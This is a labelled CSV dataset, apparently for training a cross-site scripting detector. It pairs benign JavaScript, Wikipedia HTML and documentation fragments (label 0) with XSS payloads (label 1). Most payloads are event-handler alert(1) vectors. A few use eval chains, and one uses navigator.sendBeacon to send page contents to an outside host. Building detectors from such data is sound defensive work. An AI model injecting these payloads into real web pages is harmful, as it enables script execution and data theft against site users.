payload,label
<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>,1
for (let key in data) { if (data.hasownproperty(key) && key.tolowercase().indexof(val) !== -1) { let entry = {,0
$collapsibleli[0].classlist.remove('active'),0
"x = math.sin(radian) * radius,",0
var bottom = this.$el.offset().top + containerheight,0
"<q onmousedown=""alert(1)"">test</q>",1
"<figure onmouseup=""alert(1)"">test</figure>",1
m.toast = function(options) {,0
"} else { hiddendiv.css('width', window.innerwidth / 2 + 'px'); }",0
"ga('require', 'linker');",0
"checks.push(overflow[mainvariationside] <= 0, overflow[altvariationside] <= 0)",0
<progress onfocusout=alert(1) tabindex=1 id=x></progress><input autofocus>,1
return } const nextelement = event.relatedtarget,0
"_classcallcheck(this, dropdown); var _this9 = _possibleconstructorreturn(this, (dropdown.__proto__ || object.getprototypeof(dropdown)).call(this, dropdown, el, options)); _this9.el.m_dropdown = _this9;",0
toastbootstrap.show(),0
"throw new error(""nouislider: 'step' is not numeric."")",0
"<form><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" formaction=""http://subdomain1.portswigger-labs.net/xss/xss.php"" formtarget=""alert(1)"" value=""xss via formtarget in input type submit""></form>",1
} this.pause() if (this.touchtimeout) {,0
"value: function init(els, options) { return _get(tabs.__proto__ || object.getprototypeof(tabs), ""init"", this).call(this, this, els, options); }",0
this.el.m_sidenav = this,0
"<listing onbeforepaste=""alert(1)"" contenteditable>test</listing>",1
<col onfocusout=alert(1) tabindex=1 id=x></col><input autofocus>,1
"<br onmousedown=""alert(1)"">test</br>",1
"<li id=""cite_note-propublica.org-383""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-propublica.org_383-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-propublica.org_383-1""><sup><i><b>b </b> </i> </sup> </a> <a href=""#cite_ref-propublica.org_383-2""><sup><i><b>c </b> </i> </sup> </a>",0
"<li id=""cite_note-bayesian_inference-206""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-bayesian_inference_206-0"">^ </a> </b>",0
<image3 onpointerdown=alert(1)>xss</image3>,1
"<param onkeydown=""alert(1)"" contenteditable>test</param>",1
} _exit() { scrollspy._visibleelements = scrollspy._visibleelements.filter(function(value) {,0
"<p>robot designer <a href=""/wiki/hans_moravec"" title=""hans moravec"">hans moravec </a>, cyberneticist <a href=""/wiki/kevin_warwick"" title=""kevin warwick"">kevin warwick </a> and inventor <a href=""/wiki/ray_kurzweil"" title=""ray kurzweil"">ray kurzweil </a> have predicted that humans and machines will merge in the future into <a href=""/wiki/cyborg"" title=""cyborg"">cyborgs </a> that are more capable and powerful than either.<sup id=""cite_ref-transhumanism_411-0"" class=""reference""><a href=""#cite_note-transhumanism-411"">&#91;399&#93; </a> </sup> this idea, called <a href=""/wiki/transhumanism"" title=""transhumanism"">transhumanism </a>, has roots in <a href=""/wiki/aldous_huxley"" title=""aldous huxley"">aldous huxley </a> and <a href=""/wiki/robert_ettinger"" title=""robert ettinger"">robert ettinger </a>.",0
"this._element.classlist.add(class_name_collapsing); this._element.style[dimension] = 0; this._addariaandcollapsedclass(this._triggerarray, true);",0
"<style>@keyframes slidein {}</style><content style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></content>",1
return domelem.m_taptarget; } destroy() {,0
"} var comparator = isfunction(selector) ? selector : getcomparefunction(selector); return cash(filter.call(this, function (e) {",0
"<h1 onmouseup=""alert(1)"">test</h1>",1
"</span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://observer.com/2015/08/stephen-hawking-elon-musk-and-bill-gates-warn-about-artificial-intelligence/"">""stephen hawking, elon musk, and bill gates warn about artificial intelligence"" </a>. <i>observer </i>. 19 august 2015. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20151030053323/http://observer.com/2015/08/stephen-hawking-elon-musk-and-bill-gates-warn-about-artificial-intelligence/"">archived </a> from the original on 30 october 2015<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 october",0
<bdi id=x tabindex=1 onfocus=alert(1)></bdi>,1
"<mark draggable=""true"" ondrag=""alert(1)"">test</mark>",1
_this13._openingtrigger = undefined,0
"<ul><li><a href=""/wiki/outline_of_robotics"" title=""outline of robotics"">outline </a> </li>",0
clippingrect.x = clippingrect.left; clippingrect.y = clippingrect.top; return clippingrect;,0
"<h3><span class=""mw-headline"" id=""sub-symbolic"">sub-symbolic",0
"<textarea draggable=""true"" ondragstart=""alert(1)"">test</textarea>",1
"<script>throw onerror=eval,'alert\x281\x29'</script>",1
"insertcontent(cash(parent), this); return this; },",0
mathematical definitions of intelligence:,0
} this.isopen = false; },0
<body id=x tabindex=1 onfocusin=alert(1)></body>,1
var parallaxdist = imgheight - containerheight,0
<image src/onerror=alert(1)>,1
} $('.github-commit') .find('.date'),0
<base onpointerout=alert(1)>xss</base>,1
toast.startingxpos = toast._xpos(e),0
"function arevalidelements() { for (var _len = arguments.length, args = new array(_len), _key = 0; _key < _len; _key++) { args[_key] = arguments[_key];",0
"<div draggable=""true"" contenteditable>drag me</div><font ondrop=alert(1) contenteditable>drop here</font>",1
let matchingdata = [],0
"this._updateitemstyle(el, centertweenedopacity, 0, transformstring)",0
<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>,1
"<a href=""/wiki/game_theory"" title=""game theory"">game theory </a> and <a href=""/wiki/mechanism_design"" title=""mechanism design"">mechanism design </a>:",0
"dropdown: root.queryselectorall('.dropdown-trigger:not(.no-autoinit)'),",0
"<object onbeforepaste=""alert(1)"" contenteditable>test</object>",1
"<meter onmousemove=""alert(1)"">test</meter>",1
<select id=x tabindex=1 ondeactivate=alert(1)></select><input id=y autofocus>,1
const class_dropdown = 'dropdown'; const selector_dropdown_toggle = '.dropdown-toggle'; const selector_dropdown_menu = '.dropdown-menu';,0
"callback.apply(this, arguments); removeevent(v, eventname, finalcallback); };",0
this._width = this.el.getboundingclientrect().width; this._overlay.style.display = 'block'; this._initialscrolltop = this.isopen ? this.el.scrolltop : m.getdocumentscrolltop();,0
"<style>:target {color: red;}</style><canvas id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></canvas>",1
"<template onmouseleave=""alert(1)"">test</template>",1
const class_name_fade$3 = 'fade',0
"instancemap.set(key, instance); }, get(element, key) {",0
"m.textareaautoresize($(this)); }); $(document).on('change', '.file-field input[type=""file""]', function () {",0
this._indicator.parentnode.removechild(this._indicator); if (this.options.swipeable) { this._teardownswipeabletabs();,0
"<source onbeforecut=""alert(1)"" contenteditable>test</source>",1
if (selector.cash && selector !== win) {,0
super._typecheckconfig(config) this._checkcontent(config.content) },0
} $(this.options.getactiveelement(scrollspy._visibleelements[0].attr('id'))).addclass( this.options.activeclass,0
"<marquee onmousemove=""alert(1)"">test</marquee>",1
"<p>much of traditional <a href=""/wiki/symbolic_artificial_intelligence"" title=""symbolic artificial intelligence"">gofai </a> got bogged down on <i>ad hoc </i> patches to <a href=""/wiki/symbolic_computation"" class=""mw-redirect"" title=""symbolic computation"">symbolic computation </a> that worked on their own toy models but failed to generalize to real-world results. however, around the 1990s, ai researchers adopted sophisticated mathematical tools, such as <a href=""/wiki/hidden_markov_model"" title=""hidden markov model"">hidden markov models </a> (hmm), <a href=""/wiki/information_theory"" title=""information theory"">information theory </a>, and normative bayesian <a href=""/wiki/decision_theory"" title=""decision theory"">decision theory </a> to compare or to unify competing architectures. the shared mathematical language permitted a high level of collaboration with more established fields (like <a href=""/wiki/mathematics"" title=""mathematics"">mathematics </a>, economics or <a href=""/wiki/operations_research"" title=""operations research"">operations research </a>).<sup id=""cite_ref-174"" class=""reference""><a href=""#cite_note-174"">&#91;d&#93; </a> </sup> compared with gofai, new ""statistical learning"" techniques such as hmm and neural networks were gaining higher levels of accuracy in many practical domains such as <a href=""/wiki/data_mining"" title=""data mining"">data mining </a>, without necessarily acquiring a semantic understanding of the datasets. the increased successes with real-world data led to increasing emphasis on comparing different approaches against shared test data to see which approach performed best in a broader context than that provided by idiosyncratic toy models; ai research was becoming more <a href=""/wiki/scientific_method"" title=""scientific method"">scientific </a>. nowadays results of experiments are often rigorously measurable, and are sometimes (with difficulty) reproducible.<sup id=""cite_ref-formal_methods_in_ai_43-1"" class=""reference""><a href=""#cite_note-formal_methods_in_ai-43"">&#91;43&#93; </a> </sup><sup id=""cite_ref-175"" class=""reference""><a href=""#cite_note-175"">&#91;171&#93; </a> </sup> different statistical learning techniques have different limitations; for example, basic hmm cannot model the infinite possible combinations of natural language.<sup id=""cite_ref-footnotenorvig2012_176-0"" class=""reference""><a href=""#cite_note-footnotenorvig2012-176"">&#91;172&#93; </a> </sup> critics note that the shift from gofai to statistical learning is often also a shift away from <a href=""/wiki/explainable_ai"" class=""mw-redirect"" title=""explainable ai"">explainable ai </a>. in agi research, some scholars caution against over-reliance on statistical learning, and argue that continuing research into gofai will still be necessary to attain general intelligence.<sup id=""cite_ref-footnotelangley2011_177-0"" class=""reference""><a href=""#cite_note-footnotelangley2011-177"">&#91;173&#93; </a> </sup><sup id=""cite_ref-footnotekatz2012_178-0"" class=""reference""><a href=""#cite_note-footnotekatz2012-178"">&#91;174&#93; </a> </sup>",0
"<li id=""cite_note-417""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-417"">^ </a> </b>",0
arr.join('') + '</select>'; if ($.isarray(opts.yearrange)) {,0
const event_keydown_dismiss = `keydown.dismiss${event_key}`; const event_click_data_api = `click${event_key}${data_api_key}`; const class_name_open = 'modal-open';,0
this._buildhoursview(); this._buildminutesview(); this._buildsvgclock();,0
"v.setattribute(name, value); } else { v[name] = value;",0
"<pre draggable=""true"" ondrag=""alert(1)"">test</pre>",1
if (node === getwindow(node) || !ishtmlelement(node)) { return getwindowscroll(node); } else {,0
"<p>advancements in ai have contributed to the growth of the automotive industry through the creation and evolution of self-driving vehicles. as of 2016<sup class=""plainlinks noexcerpt noprint asof-tag update"" style=""display:none;""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=artificial_intelligence&amp;action=edit"">&#91;update&#93; </a> </sup>, there are over 30 companies utilizing ai into the creation of <a href=""/wiki/self-driving_car"" title=""self-driving car"">self-driving cars </a>. a few companies involved with ai include <a href=""/wiki/tesla_motors"" class=""mw-redirect"" title=""tesla motors"">tesla </a>, <a href=""/wiki/google"" title=""google"">google </a>, and <a href=""/wiki/apple_inc."" title=""apple inc."">apple </a>.<sup id=""cite_ref-307"" class=""reference""><a href=""#cite_note-307"">&#91;296&#93; </a> </sup>",0
"var axis = getmainaxisfromplacement(baseplacement); var isvertical = [left, right].indexof(baseplacement) >= 0; var len = isvertical ? 'height' : 'width';",0
"path_input[0].value = file_names.join(', ')",0
"<div draggable=""true"" contenteditable>drag me</div><li ondrop=alert(1) contenteditable>drop here</li>",1
value: function _animateoverlayin() { var start = 0; if (this.isdragged) {,0
"<ul oncopy=""alert(1)"" contenteditable>test</ul>",1
if ( optionstoupdate[name] !== undefined ) { options[name] = newoptions[name]; },0
"<embed onbeforepaste=""alert(1)"" contenteditable>test</embed>",1
"</span> <span class=""reference-text""><cite class=""citation web""><a href=""/wiki/graham_oppy"" title=""graham oppy"">graham oppy </a> (20 january 2015). <a rel=""nofollow"" class=""external text"" href=""http://plato.stanford.edu/entries/goedel-incompleteness/#gdeargagamec"">""gödel's incompleteness theorems"" </a>. <i><a href=""/wiki/stanford_encyclopedia_of_philosophy"" title=""stanford encyclopedia of philosophy"">stanford encyclopedia of philosophy </a> </i><span class=""reference-accessdate"">. retrieved <span class=""nowrap"">27 april",0
$(el).css({ display: 'none' }),0
"<bdo onmousemove=""alert(1)"">test</bdo>",1
"return } const toggle = (selector, classname) => {",0
<blockquote id=x tabindex=1 onactivate=alert(1)></blockquote>,1
<rp id=x tabindex=1 onfocusin=alert(1)></rp>,1
function order(modifiers) {,0
"<header onmouseenter=""alert(1)"">test</header>",1
"var defaults = { 'connect': false, 'direction': 'ltr',",0
"<time onkeypress=""alert(1)"" contenteditable>test</time>",1
"this.filterquery = []; } }, {",0
"var documentelement = getdocumentelement(offsetparent); var rect = getboundingclientrect(elementorvirtualelement, offsetparentisscaled, isfixed); var scroll = {",0
"<li id=""cite_note-singularity-410""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-singularity_410-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-singularity_410-1""><sup><i><b>b </b> </i> </sup> </a> <a href=""#cite_ref-singularity_410-2""><sup><i><b>c </b> </i> </sup> </a>",0
&#x00003c,1
"<form onkeypress=""alert(1)"" contenteditable>test</form>",1
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/link-extractors.html"">link extractors</a></li>",0
"} function testpadding ( parsed, entry ) { if ( !isnumeric(entry) ){",0
value: function destroy() { this._removeeventhandlers(); this.el.taptarget = undefined;,0
"<sup onkeydown=""alert(1)"" contenteditable>test</sup>",1
.removeclass('invalid'); formreset.find(input_selector).each(function(e) { if (this.value.length) {,0
this.$el.append(chipel); this.$chips.add(chipel); },0
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/items.html"">items</a></li>",0
"<big onmouseleave=""alert(1)"">test</big>",1
const dimension = this._getdimension() this._element.classlist.remove(class_name_collapse) this._element.classlist.add(class_name_collapsing),0
$('.datepicker').datepicker(); $('.tabs').tabs(); $('.timepicker').timepicker();,0
"<style>:target {color:red;}</style><ol id=x style=""transition:color 1s"" ontransitionend=alert(1)></ol>",1
<marquee onblur=alert(1) tabindex=1 id=x></marquee><input autofocus>,1
focused.next().addclass('focused'); } },0
.css({ opacity: 1 });,0
"key: ""_isdate"", value: function _isdate(obj) { return (/date/.test(object.prototype.tostring.call(obj)) && !isnan(obj.gettime())",0
"<ruby onkeydown=""alert(1)"" contenteditable>test</ruby>",1
</span></a></dt><dd>understand scrapy versioning and api stability.</dd>,0
"<style>:target {color:red;}</style><canvas id=x style=""transition:color 1s"" ontransitionend=alert(1)></canvas>",1
"<data draggable=""true"" ondragleave=""alert(1)"">test</data>",1
if (_this18.ancestorschanged.length) {,0
"<style>@keyframes slidein {}</style><plaintext style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></plaintext>",1
"https://portswigger-labs.net/xss/xss.php?x=%3cbody%20onload=%22throw%20onerror=eval,{linenumber:1,columnnumber:1,filename:1,message:%27/*%27%2blocation}%22%3e#*/alert(1)//",1
"this.$slider.css('height', this.options.height + 'px'); } }",0
"<details onmouseover=""alert(1)"">test</details>",1
<abbr id=x tabindex=1 onactivate=alert(1)></abbr>,1
"element.addeventlistener(eventname, method, false); methods.push([eventname, method]); });",0
const innamespace = typeevent !== originaltypeevent; const events = getelementevents(element); const storeelementevent = events[typeevent] || {};,0
"<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, pp.&#160;354–360, </li>",0
"<menu onkeydown=""alert(1)"" contenteditable>test</menu>",1
"left = m.getdocumentscrollleft(), right = left + window.innerwidth, bottom = top + window.innerheight;",0
var file_field = $(this).closest('.file-field'); var path_input = file_field.find('input.file-path'); var files = $(this)[0].files;,0
"<dfn draggable=""true"" ondragleave=""alert(1)"">test</dfn>",1
<dialog id=x tabindex=1 onbeforeactivate=alert(1)></dialog>,1
return this.chipsdata,0
var baseplacement = getbaseplacement(preferredplacement); var isbaseplacement = baseplacement === preferredplacement; var fallbackplacements = specifiedfallbackplacements || (isbaseplacement || !flipvariations ? [getoppositeplacement(preferredplacement)] : getexpandedfallbackplacements(preferredplacement));,0
"<div ondblclick=""alert(1)"">test</div>",1
var to = scope_spectrum.getstep(proposal),0
var touch = e.type.indexof('touch') === 0,0
<wbr onpointerleave=alert(1)>xss</wbr>,1
this['spanminutes'].innerhtml = timepicker._addleadingzero(value),0
var href = result.ref.split('http://materializecss.com/')[1],0
"<nobr draggable=""true"" ondragstart=""alert(1)"">test</nobr>",1
return; } _this27._animateout();,0
"} _applymanipulationcallback(selector, callback) { if (iselement(selector)) {",0
"<area oncut=""alert(1)"" contenteditable>test</area>",1
"} static getinstance(element) { return data.get(getelement(element), this.data_key);",0
"})(this, (function (eventhandler, selectorengine, config) { 'use strict'",0
"leftcallback: '(function|null)', rightcallback: '(function|null)' }",0
"return (/(^#[0-9a-f]{6}$)|(^#[0-9a-f]{3}$)/i.test(a) ); }, rgb: function (a) {",0
"key: ""_handlefocus"", value: function _handlefocus(e) { if (!this.el.contains(e.target) && this._nthmodalopened === modal._modalsopen) {",0
const namespaceregex = /[^.]*(?=\..*)\.|.*/,0
_handlefabclick() { if (this.isopen) { this.close();,0
<frame onfocusout=alert(1) tabindex=1 id=x></frame><input autofocus>,1
element.dispatchevent(evt); } if (evt.defaultprevented && jqueryevent) {,0
return function (prop) { prop = camelcase(prop); if (cache[prop]) {,0
"_animatein() { $.extend(this.el.style, { display: 'block',",0
<frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>,1
"<figure draggable=""true"" ondrag=""alert(1)"">test</figure>",1
value: function adjustcalendar(calendar) {,0
"<h1 ondblclick=""alert(1)"">test</h1>",1
"if (a = /([\+\-]?[0-9#\.]+)(%|px|pt|em|rem|in|cm|mm|ex|ch|pc|vw|vh|vmin|vmax|deg|rad|turn)?$/.exec(a)) return a[2]; }function v(a) { if (-1 < a.indexof(""translate"") || ""perspective"" === a) return ""px"";if (-1 < a.indexof(""rotate"") || -1 < a.indexof(""skew"")) return ""deg"";",0
let toastelement = this._createtoast(); toastelement.m_toast = this; this.el = toastelement;,0
"el.addeventlistener('click', _this63._handleindicatorclickbound); }); }",0
hascontent() { return this.getcontent().length > 0 },0
} this.destroyselects(); this.calendarel.innerhtml = html;,0
"eventhandler.on(this._element, event_touchend, event => this._end(event)); } }",0
toastelement.m_toast = this,0
} m.taptarget = taptarget; if (m.jqueryloaded) {,0
if (absdeltax <= swipe_threshold) { return },0
<th onpointerover=alert(1)>xss</th>,1
"import { definejqueryplugin, getnextactiveelement, isdisabled } from './util/index.js'",0
const data_api_key$5 = '.data-api',0
reference: 'toggle' }; const defaulttype = {,0
if (mainaxis != null) {,0
"<strong onpaste=""alert(1)"" contenteditable>test</strong>",1
"<body oncontextmenu=""alert(1)"">test</body>",1
$('ul#nav-mobile li.search .search-wrapper i.material-icons').click(function() {,0
<button onpointerout=alert(1)>xss</button>,1
"<param onmouseenter=""alert(1)"">test</param>",1
} }; var touchhandler = {,0
let referenceelement = this._element,0
"}; document.body.nouilistener = f; document.body.addeventlistener('selectstart', f, false);",0
if (!iselement(element) || element.getclientrects().length === 0) { return false },0
<h1 id=x tabindex=1 onfocusin=alert(1)></h1>,1
"if ( typeof entry !== 'string' ) { throw new error(""nouislider: 'behaviour' must be a string containing options.""); }",0
"<img usemap=#x><map name=""x""><area href onfocus=alert(1) id=x>",1
"<label oncut=""alert(1)"" contenteditable>test</label>",1
"function range(el, options) {",0
"<style>:target {color:red;}</style><h1 id=x style=""transition:color 1s"" ontransitionend=alert(1)></h1>",1
_handledocumentclickmove(e) {,0
if (next.matches(selector)) { return [next]; },0
"<dt><a class=""reference internal"" href=""topics/settings.html""><span class=""doc"">settings",0
"window.removeeventlistener('resize', this._handlethrottledresizebound)",0
"value: function init(els, options) { return _get(pushpin.__proto__ || object.getprototypeof(pushpin), ""init"", this).call(this, this, els, options); }",0
<svg><noframes onload=alert(1)></noframes>,1
"</span> <span class=""reference-text""><a rel=""nofollow"" class=""external text"" href=""https://ishti.org/2018/11/19/using-artificial-intelligence-to-predict-flight-delays/"">using ai to predict flight delays </a>, ishti.org.",0
"<tr onkeyup=""alert(1)"" contenteditable>test</tr>",1
return; } parsed.padding = parsed.spectrum.getmargin(entry);,0
"anim({ targets: this._overlay, opacity: 0,",0
var domelem = !!el.jquery ? el[0] : el; return domelem.m_charactercounter; },0
"<b draggable=""true"" ondragstart=""alert(1)"">test</b>",1
<style id=x tabindex=1 onactivate=alert(1)></style>,1
"document.body.removeeventlistener('touchend', this._handledocumentclickbound); } }], [{",0
element.uidevent = uid eventregistry[uid] = eventregistry[uid] || {} return eventregistry[uid],0
<img src=javascript:alert('')>,1
this._supportpointerevents = boolean(window.pointerevent) this._initevents() },0
ripplestyle['transition-duration'] = effect.duration + 'ms',0
"key: ""_removeeventhandlers"", value: function _removeeventhandlers() { if (scrollspy._count === 0) {",0
prefix += math.floor(math.random() * max_uid); } while (document.getelementbyid(prefix)); return prefix;,0
if (opts.isendrange) { arr.push('is-endrange'); },0
import { definejqueryplugin } from './util/index.js' const name = 'alert' const data_key = 'bs.alert',0
"</span> <span class=""reference-text""><cite class=""citation book"">daniel merkle; martin middendorf (2013). ""swarm intelligence"". in burke, edmund k.; kendall, graham (eds.). <i>search methodologies: introductory tutorials in optimization and decision support techniques </i>. springer science &amp; business media. <a href=""/wiki/international_standard_book_number"" title=""international standard book number"">isbn </a>&#160;<a href=""/wiki/special:booksources/978-1-4614-6940-7"" title=""special:booksources/978-1-4614-6940-7""><bdi>978-1-4614-6940-7 </bdi> </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3abook&amp;rft.genre=bookitem&amp;rft.atitle=swarm+intelligence&amp;rft.btitle=search+methodologies%3a+introductory+tutorials+in+optimization+and+decision+support+techniques&amp;rft.pub=springer+science+%26+business+media&amp;rft.date=2013&amp;rft.isbn=978-1-4614-6940-7&amp;rft.au=daniel+merkle&amp;rft.au=martin+middendorf&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
"</span>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=unknown&amp;rft.jtitle=latimes.com&amp;rft.atitle=impact+of+artificial+intelligence+on+banking&amp;rft.date=1990-01-17&amp;rft.aulast=christy&amp;rft.aufirst=charles+a.&amp;rft_id=https%3a%2f%2fwww.latimes.com%2farchives%2fla-xpm-1990-01-17-fi-233-story.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
"setdataattribute(element, key, value) { element.setattribute(`data-bs-${normalizedatakey(key)}`, value) },",0
"<a onbeforecopy=""alert(1)"" contenteditable>test</a>",1
"<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, p.&#160;17, who write ""for the next 20 years the field would be dominated by these people and their students."" </li>",0
"var idealypos = triggerbrect.top - dropdownbrect.top; var dropdownbounds = { left: idealxpos,",0
return gethtmlelementscroll(node); } },0
"var _defaults = {}; var charactercounter = function (_component17) { _inherits(charactercounter, _component17);",0
"(function (global, factory) { typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory(require('../util/index.js')) : typeof define === 'function' && define.amd ? define(['../util/index'], factory) :",0
let dragdirection = totaldeltax > 0 ? 'right' : 'left',0
"function getstep ( xpct, xsteps, snap, value ) {",0
this._setupindicators(),0
<hgroup onpointerout=alert(1)>xss</hgroup>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></style>",1
.siblings('label') .removeclass('active'); },0
"<param ondblclick=""alert(1)"">test</param>",1
"<small draggable=""true"" ondragend=""alert(1)"">test</small>",1
let isfixed = this.$origin.css('position') === 'fixed',0
"<li class=""toclevel-2 tocsection-21""><a href=""#sub-symbolic""><span class=""tocnumber"">5.3",0
const getelement = object => { if (iselement(object)) { return object.jquery ? object[0] : object,0
_this72._setupeventhandlers(); return _this72; },0
"key: ""_animateinfab"", value: function _animateinfab() { var _this49 = this;",0
} } _handlefabclick() {,0
"<style>:target {transform: rotate(180deg);}</style><body id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></body>",1
this._element.classlist.add(class_name_pointer_event),0
"<img src = x onerror = ""javascript: window.onerror = alert; throw "">",1
"<mark draggable=""true"" ondragend=""alert(1)"">test</mark>",1
height: 0 }; var arrowpaddingobject = state.modifiersdata['arrow#persistent'] ? state.modifiersdata['arrow#persistent'].padding : getfreshsideobject();,0
"<element onmousedown=""alert(1)"">test</element>",1
"<audio autoplay controls onseeked=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"key: ""_removeeventhandlers"", value: function _removeeventhandlers() { document.removeeventlistener('scroll', pushpin._updateelements);",0
var height = element.offsetheight,0
"}, { key: ""_updateitemstyle"", value: function _updateitemstyle(el, opacity, zindex, transform) {",0
<menu id=x tabindex=1 onbeforedeactivate=alert(1)></menu><input autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><head ondragover=alert(1) contenteditable>drop here</head>",1
"<li><a href=""/wiki/mind%e2%80%93body_problem"" title=""mind–body problem"">mind–body problem </a>",0
$(this.container).addclass('autocomplete-content dropdown-content'),0
"}, 0); } this.istouchmoving = false;",0
"this._gettipelement().setattribute('data-popper-placement', data.state.placement)",0
<body onselectstart=alert(1)>select some text,1
"easing: 'easeinoutcubic', complete: () => { $body.css({",0
"} function addmarking ( spread, filterfunc, formatter ) { var element = document.createelement('div'),",0
let percentscrolled = (windowbottom - top) / (containerheight + windowheight); let parallax = parallaxdist * percentscrolled; if (!this._enabled) {,0
<spacer onpointermove=alert(1)>xss</spacer>,1
"<acronym onmousedown=""alert(1)"">test</acronym>",1
"}, { key: ""_setup"", value: function _setup() {",0
this.activeindex = index; this.start(); },0
<multicol onpointerover=alert(1)>xss</multicol>,1
"<style>@keyframes slidein {}</style><dir style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dir>",1
"<iframe name=""alert(1)"" src=""https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//""></iframe>",1
"const hideevent = active ? eventhandler.trigger(active, event_hide, { relatedtarget: innerelem }) : null;",0
"}) } this._queuecallback(complete, element, element.classlist.contains(class_name_fade))",0
"<multicol onmouseup=""alert(1)"">test</multicol>",1
"case left: offsets = { x: reference.x - element.width,",0
<shadow onpointermove=alert(1)>xss</shadow>,1
<cite id=x tabindex=1 onactivate=alert(1)></cite>,1
<object id=x onfocus=alert(1) type=text/html>,1
"<style>@keyframes slidein {}</style><spacer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></spacer>",1
"<li onclick=""alert(1)"">test</li>",1
let body = document.body; body.style.overflow = 'hidden'; },0
}e = e[e.length - 1],0
"<dfn onmouseover=""alert(1)"">test</dfn>",1
<meta onpointermove=alert(1)>xss</meta>,1
<hr id=x tabindex=1 onbeforeactivate=alert(1)></hr>,1
"function getdata(node, key) { var c = getdatacache(node); if (c[key] === undefined) {",0
"<dd ondblclick=""alert(1)"">test</dd>",1
responsivethreshold: 0 // breakpoint for swipeable }; class parallax extends component {,0
"<table oncut=""alert(1)"" contenteditable>test</table>",1
"<svg onunload=navigator.sendbeacon('//ssl.portswigger-labs.net/',document.body.innerhtml)>",1
"<command draggable=""true"" ondragleave=""alert(1)"">test</command>",1
"document.getelementsbyname("""")",1
"<base ondblclick=""alert(1)"">test</base>",1
"<embed onmouseenter=""alert(1)"">test</embed>",1
"</span> <span class=""reference-text""><cite class=""citation book"">ferguson, sarah; luders, brandon; grande, robert c.; how, jonathan p. (2015). <i>real-time predictive modeling and robust avoidance of pedestrians with uncertain, changing intentions </i>. <i>algorithmic foundations of robotics xi </i>. springer tracts in advanced robotics. <b>107 </b>. springer, cham. pp.&#160;161–177. <a href=""/wiki/arxiv"" title=""arxiv"">arxiv </a>:<span class=""cs1-lock-free"" title=""freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1405.5581"">1405.5581 </a>",0
"<ins onmouseenter=""alert(1)"">test</ins>",1
